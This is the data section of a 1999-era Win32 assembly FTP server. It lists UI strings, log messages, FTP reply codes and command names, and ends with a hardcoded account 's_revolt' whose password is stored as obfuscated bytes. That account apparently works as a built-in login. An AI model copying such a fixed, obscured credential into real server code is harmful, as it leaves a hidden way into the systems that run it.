;
; FTP Server ver 0.2
;
; written by caspar /CookieCrK/ in win32asm
;
; caspar@polishscene.dhs.org || caspar@ae.pl
; http://www.cookiecrk.org
;


.data

DlgAccounts	db	'Accounts',0
DlgOptions	db	'Options',0
DlgAbout	db	'About',0
DlgName		db	'Dialog',0
DlgUsers	db	'Users',0
DlgEdit		db	'EditU',0

H2D		db	'%i',0
uH2D		db	'%02u',0

DirUp		db	'..',0

RegKey		db	'Software\CookieCrK\FTP Server',0
RegKeyU		db	'Software\CookieCrK\FTP Server\Users',0
RegFlags	db	'Flags',0
RegLogFile	db	'LogFile',0


EdNameErr	db	'Name missing',0
EdNameText	db	'Enter name.',0
EdPassErr	db	'Password missing',0
EdPassText	db	'Enter password.',0
EdPassErr2	db	'Password too short',0
EdPassText2	db	'Enter at least 2 characters',0
EdUserErr	db	'User already exists',0
EdUserText	db	'Change user name.',0


OpLogFileDef	db	'c:\FTPServ.log',0

UsFrom		db	' - ',0

Rwx		db	'rwxrwxrwx   1 user     group            ',0
RDate		db	' Jul 17  1999 ',0				; heh 8-]

;********************************************************************************************
;					user interface
;********************************************************************************************


StatusServ	db	' server ',0
StatusOnline	db	'on-line',0
StatusOffline	db	'off-line',0
StatusUsers	db	' Connected users: ',0

LogStart	db	'Ftp-Server on FSEC v2.0 (Ftp Server Engine by caspar)',0
LogStartcd	db	'CookieCrK group member -=caspar@ae.pl=-',0
LogScreen	db	'Logging to screen only.',0
LogBoth		db	'Logging to screen and file - ',0
LogWait		db	' Waiting for incoming connections...',0
LogDown		db	' Server going down...',0
LogConnect	db	' Connected to  -  ',0
LogDisconnect	db	' Disconnected from  -  ',0
LogAnonymous	db	' Anonymous user has logged with password - ',0
LogNotWait	db	'Not waiting - port 21 is already in use',0
LogUnknown	db	'Not waiting - unknown error with socket',0


;********************************************************************************************
;					replies
;********************************************************************************************


OpenDataCon	db	'150 Opening data connection.',13,10,0


CommOK		db	'200 Command okay.',13,10,0
TypeOK		db	'200 Type set to ',0
HelpReply	db	'214-Available commands are:',13,10
		db	'214-USER PASS CDUP PWD CWD TYPE PORT LIST NLST',13,10
		db	'214-RETR DELE STOR RMD MKD HELP NOOP QUIT',13,10
		db	'214-Recognized commands are:',13,10
		db	'214 ACCT SMNT REIN',13,10,0
WelcomeMsg	db	'220-Ftp-Server on FSEC v2.0 (Ftp Server Engine by caspar)',13,10
		db	'220-CookieCrK group member -=caspar@ae.pl=-',13,10
		db	'220 Ready for new user.',13,10,0
TransferOK	db	'226 Transfer complete.',13,10,0
PassOK		db	'230 User logged in, proceed.',13,10,0
DirChanged	db	'250 Directory changed to ', 22h, 0, 22h,'.',13,10,0
FileActionOK	db	'250 Requested file action okay, completed.',13,10,0
CurDir		db	'257 ', 22h, 0, 22h,' is current directory.',13,10,0
DirCreated	db	'257 ', 22h, 0, 22h,' created.',13,10,0


AnonymousOK	db	'331 Anonymous access granted, need your email as password',13,10,0
UserOK		db	'331 User name okay, need password.',13,10,0


TooManyUsr	db	'421 Too many users. Try later.',0
ReqActionNot	db	'450 Requested file action not taken.',13,10,0
ReqActionAb	db	'451 Requested action aborted: local error in processing.',13,10,0


CommNotRec	db	'500 Syntax error, command unrecognized.',13,10,0
SynErrPa	db	'501 Syntax error in parameters or arguments.',13,10,0
CommNotIm	db	'502 Command not implemented.',13,10,0
BadSeq		db	'503 Bad sequence of commands.',13,10,0
CommNotImP	db	'504 Command not implemented for that parameter.',13,10,0
AnonymousBad	db	'530 Sorry, anonymous access not allowed.',13,10,0
NotLogged	db	'530 Not logged in.',13,10,0
PassBad		db	'530 Not logged in. Wrong password.',13,10,0
ActionNot	db	'550 Requested action not taken.',13,10,0


;********************************************************************************************
;					commands
;********************************************************************************************


User		db	'USER',0
Pass		db	'PASS',0
Cdup		db	'CDUP',0
Pwd		db	'PWD',0
Type1		db	'TYPE',0
Port		db	'PORT',0
List		db	'LIST',0
Nlst		db	'NLST',0
Cwd1		db	'CWD',0
Retr		db	'RETR',0
Dele		db	'DELE',0
Rmd		db	'RMD',0
Mkd		db	'MKD',0
Stor		db	'STOR',0
Quit		db	'QUIT',0

Help		db	'HELP',0
Noop		db	'NOOP',0

Acct		db	'ACCT',0
Smnt		db	'SMNT',0
Rein		db	'REIN',0


;********************************************************************************************
;					accounts
;********************************************************************************************


UserNotLogged	db	'Not Logged',0
AnonName	db	'Anonymous',0
UserName	db	's_revolt',0
UserPass	db	2ch, 2fh, 0ah, 16h, 13h, 06h, 08h, 1dh, 5eh, 0

